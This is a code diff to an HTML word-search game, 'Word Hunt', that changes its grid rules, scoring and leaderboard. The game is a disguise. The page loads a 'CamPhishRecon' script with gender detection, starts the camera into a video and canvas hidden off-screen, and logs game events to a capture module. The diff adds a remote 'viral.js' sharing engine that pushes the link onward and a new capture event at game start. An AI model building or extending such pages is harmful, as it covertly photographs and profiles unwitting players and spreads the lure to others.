@@ -9,7 +9,6 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,sans-serif}
 body{background:#1a1a3a;color:#fff;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.hidden{display:none}
 .title{font-size:clamp(24px,7vw,40px);background:linear-gradient(135deg,#6bcfff,#c44dff,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin-bottom:4px}
 .sub{color:#6bcfff;font-size:12px;margin-bottom:12px}
 #timer{font-size:28px;color:#ff6b9d;font-weight:900;margin-bottom:8px;min-height:34px}
@@ -23,6 +22,7 @@ body{background:#1a1a3a;color:#fff;overflow:hidden;touch-action:none;user-select
 .btn{background:linear-gradient(135deg,#6bcfff,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:17px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:8px}
 .btn:active{transform:scale(0.95)}
 .go{position:fixed;inset:0;background:rgba(26,26,58,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;text-align:center;padding:20px}
+.hidden{display:none}
 .go-title{font-size:clamp(20px,6vw,32px);color:#ff6b9d;margin-bottom:8px}
 .final{font-size:clamp(32px,10vw,52px);color:#ffd700;font-weight:900}
 .best{color:#88aacc;margin:8px 0 16px}
@@ -34,6 +34,7 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div class="title">📚 Word Hunt</div>
@@ -43,6 +44,7 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div id="grid"></div>
 <div id="words">Press Start to play</div>
 <button class="btn" id="startBtn">▶ Start</button>
+<div class="lb" id="menuLb"></div>
 <div class="go hidden" id="gameover">
 <div class="go-title">Time's Up!</div>
 <div class="final" id="finalScore">0</div>
@@ -96,17 +98,27 @@ g.appendChild(cell);
 }
 }
 
+var GRID_COLS=4,GRID_ROWS=4;
+
+function isAdjacent(i1,i2){
+var r1=Math.floor(i1/GRID_COLS),c1=i1%GRID_COLS;
+var r2=Math.floor(i2/GRID_COLS),c2=i2%GRID_COLS;
+return Math.abs(r1-r2)<=1&&Math.abs(c1-c2)<=1;
+}
+
 function selectCell(cell){
 if(cell.classList.contains('selected'))return;
+var idx=parseInt(cell.dataset.idx);
+if(selected.length>0&&!isAdjacent(selected[selected.length-1].idx,idx))return;
 cell.classList.add('selected');
-selected.push({idx:parseInt(cell.dataset.idx),letter:cell.textContent});
+selected.push({idx:idx,letter:cell.textContent});
 }
 
 function checkWord(){
 if(selected.length===0)return;
 var word=selected.map(function(s){return s.letter;}).join('');
 if(word.length>=3&&WORDS.indexOf(word)>=0&&foundWords.indexOf(word)<0){
-foundWords.push(word);var pts=word.length*10*(word.length>3?2:1);score+=pts;
+foundWords.push(word);var pts=30;score+=pts;
 document.getElementById('score').textContent=score;
 document.getElementById('wordCount').textContent=foundWords.length;
 document.getElementById('words').innerHTML='<span style="color:#7bed9f">✓ '+word+' +'+pts+' pts!</span>';
@@ -123,7 +135,7 @@ selected=[];
 addEventListener('mouseup',function(){if(isDown){isDown=false;checkWord();}});
 
 function startGame(){
-if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('wordhunt_game_start',{});}
 startCamera();
 newGrid();score=0;foundWords=[];timeLeft=60;running=true;selected=[];
 document.getElementById('score').textContent='0';
@@ -161,9 +173,13 @@ document.getElementById('gameover').classList.remove('hidden');showLb();
 if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,words:foundWords.length});
 }
 
-function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('goLb').innerHTML=h;}
+function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('goLb').innerHTML=h;var ml=document.getElementById('menuLb');if(ml)ml.innerHTML=h;}
 
 function shareCard(t){
+if(window.ViralEngine){
+ViralEngine.doShare(t,score,'📚 I scored '+score+' in Word Hunt with '+foundWords.length+' words! '+SHARE_URL);
+return;
+}
 var msg='📚 I scored '+score+' in Word Hunt with '+foundWords.length+' words! '+SHARE_URL;
 if(navigator.canShare){navigator.share({text:msg,title:'Word Hunt'}).catch(function(){});return;}
 if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
